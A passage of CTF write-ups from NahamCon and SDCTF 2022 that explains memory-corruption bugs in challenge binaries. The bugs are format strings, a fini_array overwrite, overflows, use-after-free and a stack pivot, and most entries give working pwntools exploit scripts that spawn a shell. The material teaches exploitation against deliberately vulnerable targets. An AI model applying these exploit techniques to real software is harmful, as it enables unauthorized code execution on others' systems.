    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: @M_alpha#3534</p>
<p>Try out my new reading list maker! Keep track of what books you would like to read.</p>
<p>files: <a href="reading_list">reading_list</a>, <a href="libc-2.31.so">libc-2.31.so</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vuln"><a href="#0x2-Vuln" class="headerlink" title="0x2 Vuln"></a>0x2 Vuln</h1><p>the main vuln in this program is in the <code>sym.print_list</code>, it direct print what exactly in the heap. This allow us to have arbitrary read and write in the memory space.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sym.imp.printf(*(_obj.booklist + var_4h * 8));</span><br></pre></td></tr></table></figure>

<p>Since all the protection is on, the simplest way to do this program is to overwrite <code>__free_hook</code> to <code>system</code>. Then, when we call <code>free(&quot;/bin/sh&quot;)</code>, <code>system(&quot;/bin/sh&quot;)</code> will be called and we will get a shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><p>credit: @Green-Avocado</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc = ELF(&#x27;libc-2.31.so&#x27;)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;What is your name: &quot;, b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)</span><br><span class="line">io.sendlineafter(b&quot;Enter the book name: &quot;, b&quot;%23$p&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)</span><br><span class="line">io.recvuntil(b&quot;1. &quot;)</span><br><span class="line">libc.address = int(io.recvline(), 0) - libc.libc_start_main_return</span><br><span class="line"></span><br><span class="line">info(&quot;LIBC: &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;4&quot;)</span><br><span class="line">io.sendlineafter(b&quot;What is your name: &quot;, flat([</span><br><span class="line">    libc.sym[&#x27;__free_hook&#x27;] + 0,</span><br><span class="line">    libc.sym[&#x27;__free_hook&#x27;] + 2,</span><br><span class="line">    libc.sym[&#x27;__free_hook&#x27;] + 4,</span><br><span class="line">    ]))</span><br><span class="line"></span><br><span class="line">fmt = &quot;&quot;</span><br><span class="line">written = 0</span><br><span class="line">to_write = 0</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)</span><br><span class="line">io.sendlineafter(b&quot;Enter the book name: &quot;, f&quot;%&#123;(libc.sym[&#x27;system&#x27;]) % 0x10000&#125;c%22$hn&quot;.encode())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)</span><br><span class="line">io.sendlineafter(b&quot;Enter the book name: &quot;, f&quot;%&#123;(libc.sym[&#x27;system&#x27;] &gt;&gt; 0x10) % 0x10000&#125;c%23$hn&quot;.encode())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)</span><br><span class="line">io.sendlineafter(b&quot;Enter the book name: &quot;, f&quot;%&#123;(libc.sym[&#x27;system&#x27;] &gt;&gt; 0x20) % 0x10000&#125;c%24$hn&quot;.encode())</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)</span><br><span class="line">io.sendlineafter(b&quot;Enter the book name: &quot;, b&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;&gt; &quot;, b&quot;3&quot;)</span><br><span class="line">io.sendlineafter(b&quot;: &quot;, b&quot;5&quot;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="0x2-Flag"><a href="#0x2-Flag" class="headerlink" title="0x2 Flag"></a>0x2 Flag</h1><p>None</p>
]]></content>
  </entry>
  <entry>
    <title>[PWN] Detour [Nahamcon CTF 2022]</title>
    <url>/ctf-writeup/2022/nahamcon/pwn/detour/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: @M_alpha#3534</p>
<p>write-what-where as a service! Now how do I detour away from the intended path of execution?</p>
<p>files: <a href="detour">detour</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vuln"><a href="#0x2-Vuln" class="headerlink" title="0x2 Vuln"></a>0x2 Vuln</h1><p>This binary give you a chance to write a value to an address. Since stack address is randomized, we can&#39;t overwrite rip.</p>
<p>According to this <a href="https://stackoverflow.com/questions/26292964/when-will-the-fini-array-section-being-used">post</a>, when program exit normally, it will call functions in <code>obj.__fini_array</code>.</p>
<p>for example, this this binary. the first address in <code>fini_array</code> point to <code>__do_global_dtors_aux</code>. This function will be called after function return from main.</p>
<p>So, we can write <code>sym.win</code> address to <code>fini_array</code>. Then, after function return from main, it will call <code>win</code> and give us the shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0x004010f0]&gt; px/a @ obj.__do_global_dtors_aux_fini_array_entry</span><br><span class="line">0x004031c8  0x004011a0 0x00000000 0x00000001 0x00000000  ..@.............</span><br><span class="line">[0x004010f0]&gt; afl~0x004011a0</span><br><span class="line">0x004011a0    3 33   -&gt; 32   sym.__do_global_dtors_aux</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exe = context.binary = ELF(&quot;detour&quot;)</span><br><span class="line">fini_array = exe.symbols[&quot;__do_global_dtors_aux_fini_array_entry&quot;]</span><br><span class="line">base = exe.symbols[&quot;base&quot;]</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;What: &quot;,str(exe.sym[&quot;win&quot;]).encode())</span><br><span class="line">io.sendlineafter(b&quot;Where: &quot;,str(fini_array-base).encode())</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Flag"><a href="#0x2-Flag" class="headerlink" title="0x2 Flag"></a>0x2 Flag</h1><p>None</p>
]]></content>
  </entry>
  <entry>
    <title>[Warmup] Crash Override [Nahamcon CTF 2022]</title>
    <url>/ctf-writeup/2022/nahamcon/warmup/crash_override/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: @M_alpha#3534</p>
<p>Remember, hacking is more than just a crime. It&#39;s a survival trait.</p>
<p>files: <a href="crash_override">crash_override</a>, <a href="crash_override.c">crash_override.c</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vuln"><a href="#0x2-Vuln" class="headerlink" title="0x2 Vuln"></a>0x2 Vuln</h1><p>very simple buffer overflow</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void win(int sig) &#123;</span><br><span class="line">    // print flag</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    char buffer[2048];</span><br><span class="line">    gets(buffer);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line">wait_for_debugger(io)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;!\n&quot;,flat(&#123;</span><br><span class="line">    0x800+0x8:exe.sym[&quot;win&quot;]</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Flag"><a href="#0x2-Flag" class="headerlink" title="0x2 Flag"></a>0x2 Flag</h1><p>None</p>
]]></content>
  </entry>
  <entry>
    <title>[Warmup] flagcat [Nahamcon CTF 2022]</title>
    <url>/ctf-writeup/2022/nahamcon/warmup/flagcat/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: @JohnHammond#6971</p>
<p>Do you know what the cat command does in the Linux command-line?</p>
<p>files: <a href="flagcat">flagcat</a></p>
<h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><p>a text file, using command <code>cat</code> to get flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flagcat</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Flag"><a href="#0x2-Flag" class="headerlink" title="0x2 Flag"></a>0x2 Flag</h1><p>flag{ab3cbaf45def9056dbfad706d597fb53}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Breakfast Menu [SDCTF 2022]</title>
    <url>/ctf-writeup/2022/sdctf/pwn/breakfast-menu/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Medium</p>
<p>I’m awfully hungry, with all these options to choose from, what should I order?</p>
<p>Connect</p>
<p>nc breakfast.sdc.tf 1337</p>
<p>By green beans</p>
<p>files: <a href="BreakfastMenu">BreakfastMenu</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>In short, binary have a Use-After-Free (UAF) vulnerability. Allow us to edit the heap after we free the heap. </p>
<p>Moreover, the dangling pointers are global variable. Therefore we can utilze the single linked list in heap and do a write on the address we want.</p>
<p>The basic idea of this challenge is first replace <code>free</code> with <code>puts</code> to leak libc address, then replace <code>free</code> with <code>system</code>, call <code>system(&quot;/bin/sh&quot;)</code> to get shell</p>
<ol>
<li>malloc malloc free free to create a single linked list in heap</li>
<li>edit obj.orders[1], write address of obj.orders in it</li>
<li>malloc malloc. now obj.orders[2] point to a heap, obj.order.[3] point to obj.orders[0]</li>
<li>edit order[2], write <code>/bin/sh\x00</code> into the heap</li>
<li>edit order[3] to got.free &#x3D;&gt; obj.orders[0] will change to got.free</li>
<li>edit obj.orders[0] to got.puts, this replace function <code>free</code> with function <code>puts</code></li>
<li>edit obj.orders[3] to got.printf</li>
<li>free(obj.orders[0]) this will call puts(got.printf) and leak libc address</li>
<li>edit obj.orders[3] to got.free, then edit obj.orders[0], replace <code>free</code> with <code>system</code></li>
<li>free(obj.orders[2]), this will call <code>system(&quot;/bin/sh&quot;)</code> and give us a shell.</li>
</ol>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;BreakfastMenu_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;breakfast.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># make one heap pointer point to obj.orders</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;got.free, got.puts&quot;</span>,<span class="built_in">hex</span>(exe.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.symbols[<span class="string">&quot;orders&quot;</span>]]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;free&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;free&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.got[<span class="string">&quot;free&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># exe.got[&quot;free&quot;] = exe.sym[&quot;puts&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([<span class="string">b&#x27;AAAAA\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([<span class="string">b&#x27;AAAA\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.sym[<span class="string">&quot;puts&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;printf&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.got[<span class="string">&quot;printf&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(obj.orders[0]) =&gt; puts(obj.orders[0])</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>.from_bytes(io.recvuntil(<span class="string">b&#x27;\n1. &#x27;</span>,drop=<span class="literal">True</span>),<span class="string">&quot;little&quot;</span>) - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc leak&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;free&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.got[<span class="string">&quot;free&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># exe.got[&quot;free&quot;] = libc.sym[&quot;system&quot;]</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([libc.sym[<span class="string">&quot;system&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(obj.orders[2]) =&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{Th3_m05t_1Mp0Rt4nT_m34L_0f_th3_d4Y}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Horoscope [SDCTF 2022]</title>
    <url>/ctf-writeup/2022/sdctf/pwn/horoscope/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Easy</p>
<p>This program will predict your future!</p>
<p>Connect<br>nc horoscope.sdc.tf 1337</p>
<p>By green beans</p>
<p>files: <a href="horoscope">horoscope</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>binary have a <code>/bin/sh</code> backdoor in function <code>sym.test</code>.</p>
<p><code>main</code> has a buffer overflow vulnerbility, we can change rip of main to <code>sym.test</code> and get shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;./horoscope&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def conn():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;horoscope.sdc.tf&quot;,1337)</span><br><span class="line"></span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line">io = conn()</span><br><span class="line">if args.R2:</span><br><span class="line">    input(&quot;asd&quot;)</span><br><span class="line">io.sendlineafter(b&quot;own horoscope\n&quot;,flat(&#123;</span><br><span class="line">    0:b&quot;01/01/2001/1234\x00&quot;,</span><br><span class="line">    0x30+8:0x0040095f</span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Oil Spill [SDCTF 2022]</title>
    <url>/ctf-writeup/2022/sdctf/pwn/oil-spill/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Easy</p>
<p>Darn, these oil spills are going crazy nowadays. It looks like there&#39;s a little bit more than oil coming out of this program though...</p>
<p>Connect<br>nc oil.sdc.tf 1337</p>
<p>By green beans</p>
<p>files: <a href="OilSpill">OilSpill</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>At start of the program, program leak libc address and stack address.</p>
<p>Then, the program uses <code>(*_reloc.printf)();</code>. We can use this printf to write whatever we want.</p>
<p>So the exploit would be overwriting the rip with libc one_gadget to get shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;./OilSpill_patched&quot;)</span><br><span class="line">libc = ELF(&quot;./libc6_2.27-3ubuntu1.5_amd64.so&quot;)</span><br><span class="line">ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def conn():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        if args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;oil.sdc.tf&quot;, 1337)</span><br><span class="line"></span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    r = conn()</span><br><span class="line">    if args.R2:</span><br><span class="line">        input(&quot;wait&quot;)</span><br><span class="line">    x = r.recvuntil(b&quot;\n&quot;,drop=True).split(b&quot;, &quot;)</span><br><span class="line">    libc.address = int(x[0],16) - libc.sym[&quot;puts&quot;]</span><br><span class="line">    rip_address = int(x[2],16) + 0x148</span><br><span class="line">    print(&quot;rip addr&quot;,hex(rip_address))</span><br><span class="line">    print(&quot;libc base addr&quot;,hex(libc.address))</span><br><span class="line">    one_gadget = libc.address+0x10a2fc</span><br><span class="line">    print(&quot;one_gadget&quot;,hex(one_gadget))</span><br><span class="line">    r.sendlineafter(b&#x27;clean it?\n&#x27;,fmtstr_payload(8,&#123;rip_address:one_gadget&#125;,write_size=&#x27;short&#x27;))</span><br><span class="line">    r.recvuntil(b&quot;Proposition&quot;)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>sdctf{th4nks_f0r_S4V1nG_tH3_duCk5}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Secure Horoscope [SDCTF 2022]</title>
    <url>/ctf-writeup/2022/sdctf/pwn/secure-horoscope/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Medium</p>
<p>Our horoscope developers have pivoted to a more security-focused approach to predicting the future. You won’t find breaking into this one quite so easy!</p>
<p>Connect<br>nc sechoroscope.sdc.tf 1337</p>
<p>By green beans</p>
<p>files: <a href="secureHoroscope">secureHoroscope</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>In function <code>dbg.getInfo</code>, there is <code>0x8c-0x70 = 0x1c</code> long buffer over. Although it is very small. It still allow us to do a stack pivot.</p>
<ol>
<li>overwrite rbp to writable memory page, jump <code>dbg.getInfo</code> again, but skip callee prologue so that rbp stay the same.</li>
<li>write payload (leak libc address and return to dbg.getInfo) to current stack frame</li>
<li>double leave ret, point rsp to our payload</li>
<li>write ropchain for calling system(&quot;&#x2F;bin&#x2F;sh&quot;) to get shell</li>
</ol>
